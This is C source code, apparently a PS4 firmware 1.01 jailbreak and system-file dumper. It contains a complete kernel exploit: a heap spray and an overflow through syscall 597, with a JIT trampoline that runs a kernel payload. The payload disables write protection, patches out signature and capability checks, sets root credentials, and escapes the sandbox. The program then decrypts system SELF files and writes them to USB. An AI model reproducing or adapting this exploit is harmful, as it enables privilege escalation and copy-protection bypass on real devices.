#include "ps4.h"

#define VERSION 101

#define DEBUG_SOCKET

#include "defines.h"
#include "elf64.h"

#define DT_DIR    0x000004
#define DT_REG    0x000008
#define DEC_SIZE  0x100000

static int sock;
static void *dump;

/* dump file functions */

int read_decrypt_segment(int fd, uint64_t index, uint64_t offset, size_t size, uint8_t *out)
{
    uint8_t *outPtr = out;
    uint64_t outSize = size;
    uint64_t realOffset = (index << 32) | offset;
    
    while (outSize > 0) {
        size_t bytes = (outSize > DEC_SIZE) ? DEC_SIZE : outSize;
        uint8_t *addr = (uint8_t*)mmap(0, bytes, PROT_READ, MAP_PRIVATE | 0x80000, fd, realOffset);
        
        if (addr != MAP_FAILED)
        {
            memcpy(outPtr, addr, bytes);
            munmap(addr, bytes);
        }
        else
        {
            return 0;
        }
        
        outPtr += bytes;
        outSize -= bytes;
        realOffset += bytes;
    }
    return 1;
}

int is_segment_in_other_segment(Elf64_Phdr *phdr, int index, Elf64_Phdr *phdrs, int num)
{
    for (int i = 0; i < num; i += 1) {
        Elf64_Phdr *p = &phdrs[i];
        if (i != index) {
            if (p->p_filesz > 0) {
                if ((phdr->p_offset >= p->p_offset) && ((phdr->p_offset + phdr->p_filesz) <= (p->p_offset + p->p_filesz))) {
                    return 1;
                }
            }
        }
    }
    return 0;
}

SegmentBufInfo *parse_phdr(Elf64_Phdr *phdrs, int num, int *segBufNum)
{
    //printfsocket("segment num : %d\n", num);
    SegmentBufInfo *infos = (SegmentBufInfo *)malloc(sizeof(SegmentBufInfo) * num);
    int segindex = 0;
    for (int i = 0; i < num; i += 1) {
        Elf64_Phdr *phdr = &phdrs[i];

        if (phdr->p_filesz > 0) {
            if ((!is_segment_in_other_segment(phdr, i, phdrs, num)) || (phdr->p_type == 0x6fffff01)) {
                SegmentBufInfo *info = &infos[segindex];
                segindex += 1;
                info->index = i;
                info->bufsz = (phdr->p_filesz + (phdr->p_align - 1)) & (~(phdr->p_align - 1));
                info->filesz = phdr->p_filesz;
                info->fileoff = phdr->p_offset;
                info->enc = (phdr->p_type != 0x6fffff01) ? 1 : 0;
            }
        }
    }
    *segBufNum = segindex;
    return infos;
}

void do_dump(char *saveFile, int fd, SegmentBufInfo *segBufs, int segBufNum, Elf64_Ehdr *ehdr)
{
    int sf = open(saveFile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (sf != -1) 
    {
        size_t elfsz = 0x40 + ehdr->e_phnum * sizeof(Elf64_Phdr);
        write(sf, ehdr, elfsz);

        for (int i = 0; i < segBufNum; i += 1) {
            uint8_t *buf = (uint8_t*)malloc(segBufs[i].bufsz);
            memset(buf, 0, segBufs[i].bufsz);
            if (segBufs[i].enc)
            {
                if (read_decrypt_segment(fd, segBufs[i].index, 0, segBufs[i].filesz, buf)) {
                    lseek(sf, segBufs[i].fileoff, SEEK_SET);
                    write(sf, buf, segBufs[i].bufsz);
                }
            }
            else
            {
                lseek(fd, -segBufs[i].filesz, SEEK_END);
                read(fd, buf, segBufs[i].filesz);
                lseek(sf, segBufs[i].fileoff, SEEK_SET);
                write(sf, buf, segBufs[i].filesz);
            }
            free(buf);
        }
        close(sf);
    }
    else
    {
        printfsocket("[-] can't dump: %s\n", saveFile);
    }
}

void decrypt_and_dump_self(char *selfFile, char *saveFile)
{
    int fd = open(selfFile, O_RDONLY, 0);
    if (fd != -1) 
    {
        void *addr = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        if (addr != MAP_FAILED)
        {
            uint16_t snum = *(uint16_t*)((uint8_t*)addr + 0x18);
            Elf64_Ehdr *ehdr = (Elf64_Ehdr *)((uint8_t*)addr + 0x20 + snum * 0x20);

            // shdr fix
            ehdr->e_shoff = ehdr->e_shentsize = ehdr->e_shnum = ehdr->e_shstrndx = 0;

            Elf64_Phdr *phdrs = (Elf64_Phdr *)((uint8_t *)ehdr + 0x40);

            int segBufNum = 0;
            SegmentBufInfo *segBufs = parse_phdr(phdrs, ehdr->e_phnum, &segBufNum);
            do_dump(saveFile, fd, segBufs, segBufNum, ehdr);

            free(segBufs);
            munmap(addr, 0x4000);
        }
        else 
        {
            printfsocket("[-] can't mmap: %s\n", selfFile);
        }
        close(fd);
    }
    else 
    {
        printfsocket("[-] can't open: %s\n", selfFile);
    }
}


/* dlclose payload funtions */

void payload(struct knote *kn) 
{
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	__asm__ volatile("mov %0, %%gs:0" : "=r"(td));

	// Enable UART output
	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833DC96E;
    *securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0

    // Print test message to the UART line
    printfkernel("\n\n\n\n\n\n\n\n\nHello from kernel :-)\n\n\n\n\n\n\n\n\n");

    // Disable write protection
    uint64_t cr0 = readCr0();
    writeCr0(cr0 & ~X86_CR0_WP);
    
    // Patch invokecheck error -13 (0xfffffff3) to be 0 for decrypting root selfs, may not work first time but 2nd try does it.
    *(char *)0xFFFFFFFF827E82F6 = 0x00;
    *(char *)0xFFFFFFFF827E82F7 = 0x00;
    *(char *)0xFFFFFFFF827E82F8 = 0x00;
    *(char *)0xFFFFFFFF827E82F9 = 0x00;
    
    *(char *)0xFFFFFFFF827E8316 = 0x00;
    *(char *)0xFFFFFFFF827E8317 = 0x00;
    *(char *)0xFFFFFFFF827E8318 = 0x00;
    *(char *)0xFFFFFFFF827E8319 = 0x00;
    
    // Patch sceSblACMgrHasMmapSelfCapability to return 1
    *(char *)0xFFFFFFFF8264F450 = 0xB8;
    *(char *)0xFFFFFFFF8264F451 = 0x01;
    *(char *)0xFFFFFFFF8264F452 = 0x00;
    *(char *)0xFFFFFFFF8264F453 = 0x00;
    *(char *)0xFFFFFFFF8264F454 = 0x00;
    *(char *)0xFFFFFFFF8264F455 = 0xC3;
    
    // Patch sceSblACMgrIsAllowedToMmapSelf to return 1
    *(char *)0xFFFFFFFF8264F460 = 0xB8;
    *(char *)0xFFFFFFFF8264F461 = 0x01;
    *(char *)0xFFFFFFFF8264F462 = 0x00;
    *(char *)0xFFFFFFFF8264F463 = 0x00;
    *(char *)0xFFFFFFFF8264F464 = 0x00;
    *(char *)0xFFFFFFFF8264F465 = 0xC3;
    
    // Bypass sceSblAuthMgrIsLoadable call in vm_mmap
    *(char *)0xFFFFFFFF82612FD9 = 0x31;
    *(char *)0xFFFFFFFF82612FDA = 0xC0;
    *(char *)0xFFFFFFFF82612FDB = 0x90;
    *(char *)0xFFFFFFFF82612FDC = 0x90;
    *(char *)0xFFFFFFFF82612FDD = 0x90;
    
    // Restore write protection
    writeCr0(cr0);
    
    // Resolve creds
    cred = td->td_proc->p_ucred;

    // Escalate process to root
    cred->cr_uid = 0;
    cred->cr_ruid = 0;
    cred->cr_rgid = 0;
    cred->cr_groups[0] = 0;

    void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
    
    // sceSblACMgrIsSystemUcred
    uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
    *sonyCred = 0xFFFFFFFFFFFFFFFF;
    
    // sceSblACMgrGetDeviceAccessType
    uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
    *sceProcType = 0x3800000000000013; // Max access
    
    // sceSblACMgrHasSceProcessCapability
    uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
    *sceProcCap = 0xFFFFFFFFFFFFFFFF; // Sce Process
    
    ((uint64_t *)0xFFFFFFFF83384188)[0] = 0x123456; // priv_check_cred bypass with suser_enabled=true
    ((uint64_t *)0xFFFFFFFF8324ACE8)[0] = 0; // bypass priv_check

    // Jailbreak ;)
    cred->cr_prison = (void *)0xFFFFFFFF83244740; // &prison0

    // Break out of the sandbox
    void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
    uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
    uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
    uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF833A7750;
    *td_fdp_fd_rdir = *rootvnode;
    *td_fdp_fd_jdir = *rootvnode;
}

int kernelAllocation(size_t size, int fd) 
{
    SceKernelEqueue queue = 0;
    sceKernelCreateEqueue(&queue, "kexec");

    sceKernelAddReadEvent(queue, fd, 0, NULL);

    return queue;
}

void kernelFree(int allocation)
{
    close(allocation);
}

void *exploitThread(void *none) 
{
    printfsocket("[ ] Entered exploitThread\n");

    uint64_t bufferSize = 0x8000;
    uint64_t overflowSize = 0x8000;
    uint64_t copySize = bufferSize + overflowSize;
    
    // Round up to nearest multiple of PAGE_SIZE
    uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
    
    uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    munmap(mapping + mappingSize, PAGE_SIZE);
    
    uint8_t *buffer = mapping + mappingSize - copySize;
    
    int64_t count = (0x100000000 + bufferSize) / 4;

    // Create structures
    struct knote kn;
    struct filterops fo;
    struct knote **overflow = (struct knote **)(buffer + bufferSize);
    overflow[2] = &kn;
    kn.kn_fop = &fo;

    // Setup trampoline to gracefully return to the calling thread
    void *trampw = NULL;
    void *trampe = NULL;
    int executableHandle;
    int writableHandle;
    uint8_t trampolinecode[] = {
        0x58, // pop rax
        0x48, 0xB8, 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xFFFFFFFF82467D59 on 1.01 //0xFFFFFFFF82403919 1.76
        0x50, // push rax
        0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
        0xFF, 0xE0 // jmp rax
    };

    // Get Jit memory
    sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
    sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

    // Map r+w & r+e
    trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
    trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

    // Copy trampoline to allocated address
    memcpy(trampw, trampolinecode, sizeof(trampolinecode));    
    *(void **)(trampw + 14) = (void *)payload;

    // Call trampoline when overflown
    fo.f_detach = trampe;

    // Start the exploit
    int sockets[0x2000];
    int allocation[50], m = 0, m2 = 0;
    int fd = (bufferSize - 0x800) / 8;

    printfsocket("[ ] Creating %d sockets\n", fd);

    // Create sockets
    for (int i = 0; i < 0x2000; i++) {
        sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
        if (sockets[i] >= fd)
        {
            sockets[i + 1] = -1;
            break;
        }
    }

    // Spray the heap
    for(int i = 0; i < 50; i++) {
        allocation[i] = kernelAllocation(bufferSize, fd);
        printfsocket("[ ] allocation = %llp\n", allocation[i]);
    }

    // Create hole for the system call's allocation
    m = kernelAllocation(bufferSize, fd);
    m2 = kernelAllocation(bufferSize, fd);
    kernelFree(m);

    // Perform the overflow
    int result = syscall(597, 1, mapping, &count);
    printfsocket("[ ] Result: %d\n", result);

    // Execute the payload
    printfsocket("[ ] Freeing m2\n");
    kernelFree(m2);
    
    // Close sockets
    for(int i = 0; i < 0x2000; i++) {
        if(sockets[i] == -1)
            break;
        sceNetSocketClose(sockets[i]);
    }
    
    // Free allocations
    for(int i = 0; i < 50; i++) {
        kernelFree(allocation[i]);
    }
    
    // Free the mapping
    munmap(mapping, mappingSize);
    
    return NULL;
}

static void decrypt_self_to_elf(char *file, char *usb)
{
    char *dot;

    // Check filename and open file
    dot = strrchr(file, '.');
    //printfsocket("Dot: %s\n", dot);
    if (!dot) return;
    if (strcmp(dot, ".elf")  &&
        strcmp(dot, ".self") &&
        strcmp(dot, ".sprx")){
        return;
    }
    
    // Tomorrow...
    // strcmp(dot, ".sdll") &&
    // strcmp(dot, ".bin") &&
    
    char name[1024];
    char usbdir[1024];
    
    strcpy(name, file);
    //printfsocket("Name: %s\n", name);
    //printfsocket("Directory: %s\n", usb);
    
    snprintf(usbdir, sizeof(usbdir), "%s/%s", usb, name+2);
    
    decrypt_and_dump_self(name+1, usbdir);
}

static int traverse_dir(char *base, char *usb, void(*handler)(char *, char *))
{
    char name[1024];
    char usbdir[1024];
    
    DIR *dir;
    struct dirent *entry;
    
    if (!(dir = opendir(base)))
        return 1;
    
    while ((entry = readdir(dir)) != NULL) {
        char *dname = entry->d_name;
        switch(entry->d_type)
        {
            case DT_DIR:
                //printfsocket("Directory: %s\n", dname);
                if (!strcmp(dname, ".") ||
                    !strcmp(dname, "..") ||
                    !strcmp(dname, "dev") ||
                    !strcmp(dname, "mnt") ||
                    !strcmp(dname, "preinst") ||
                    !strcmp(dname, "preinst2") ||
                    !strcmp(dname, "system_data") ||
                    !strcmp(dname, "system_tmp") ||
                    !strcmp(dname, "user")) {
                    continue;
                }
                
                snprintf(name, sizeof(name), "%s/%s", base, dname);
                
                if (!strcmp(dname, "lib") || !strcmp(dname, "sys"))
                    snprintf(usbdir, sizeof(usbdir), "%s/%s/%s", usb, base+2, dname);
                else
                    snprintf(usbdir, sizeof(usbdir), "%s/%s", usb, base+2);
                
                //printfsocket("USB: %s\n", usbdir);
                mkdir(usbdir, 0644);
                
                traverse_dir(name, usb, handler);
                break;
                
            case DT_REG:
                //printfsocket("File: %s\n", dname);
                /*
                if (!strcmp(dname, "aacs.bin") ||
                    !strcmp(dname, "bdplus.bin") ||
                    !strcmp(dname, "dvdcps.bin")) {
                    continue;
                }*/
                
                snprintf(name, sizeof(name), "%s/%s", base, dname);
                //printfsocket("Name: %s\n", name);
                handler(name, usb);
                break;
        }
    }
    closedir(dir);
    return 0;
}

int wait_for_usb(char *usb_name, char *usb_path)
{
    int fd = open("/mnt/usb0/.probe", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd != -1) {
        close(fd);
        unlink("/mnt/usb0/.probe");
        sprintf(usb_name, "%s", "USB0");
        sprintf(usb_path, "%s", "/mnt/usb0");
        return 1;
    }
    return 0;
}


/* Program Start */

int _main(void)
{
    ScePthread thread;

    initKernel();    
    initLibc();
    initNetwork();
    initJIT();
    initPthread();

#ifdef DEBUG_SOCKET
    struct sockaddr_in server;

    server.sin_len = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = IP(10, 13, 37, 101);
    server.sin_port = sceNetHtons(9022);
    memset(server.sin_zero, 0, sizeof(server.sin_zero));
    sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
    sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
    
    int flag = 1;
    sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
    
    dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
#endif

    printfsocket("[ ] Starting...\n");
    printfsocket("[ ] UID = %d\n", getuid());
    printfsocket("[ ] GID = %d\n", getgid());
    
    if (getuid() != 0)
    {
        // Create exploit thread
        if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0)
        {
            printfsocket("[-] pthread_create error\n");
            return 0;
        }

        // Wait for thread to exit
        scePthreadJoin(thread, NULL);

        // At this point we should have root and jailbreak
        if (getuid() != 0)
        {
            printfsocket("[-] Error: Kernel patch failed!\n");
            sceNetSocketClose(sock);
            return 1;
        }

        printfsocket("[ ] Kernel patch success!\n");
    }

    // DuMp Em AlL! */
    char usb_name[64];
    char usb_path[64];
    char root_dir[64];
    
    // Get your USB drive ready
    if (!wait_for_usb(usb_name, usb_path)) {
        do {
            sceKernelSleep(1);
        }
        while (!wait_for_usb(usb_name, usb_path));
    }
    
    // Make our versioned USB directory
    sprintf(root_dir, "%s/%d", usb_path, VERSION);
    printfsocket("[ ] Path: %s\n", root_dir);
    mkdir(root_dir, 0644);

    traverse_dir("/", root_dir, decrypt_self_to_elf);
    
#ifdef DEBUG_SOCKET
    munmap(dump, PAGE_SIZE);    
#endif
    
    sceNetSocketClose(sock);
    
    return 0;
}